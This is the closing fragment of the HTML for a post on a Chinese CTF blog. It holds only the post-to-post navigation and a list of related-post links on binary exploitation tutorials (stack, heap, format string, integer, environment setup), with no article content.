href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022-04/KeepTrying/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/fighting.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">KeepTrying</div></div></a></div><div class="next-post pull-right"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Integer/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门到入狱-Integer</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2022-05/pwn题如何配置和靶机一样的环境/" title="pwn题如何配置和靶机一样的环境"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">pwn题如何配置和靶机一样的环境</div></div></a></div><div class="relatedPosts_item"><a href="/2022-05/从0开始的pwn题环境配置/" title="从0开始的pwn题环境配置"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">从0开始的pwn题环境配置</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Integer/" title="PWN入门到入狱-Integer"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Integer</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Heap/" title="PWN入门到入狱-Heap"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Heap</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Format/" title="PWN入门到入狱-Format"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Format</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Stack/" title="PWN入门到入狱-Stack"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Stack</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>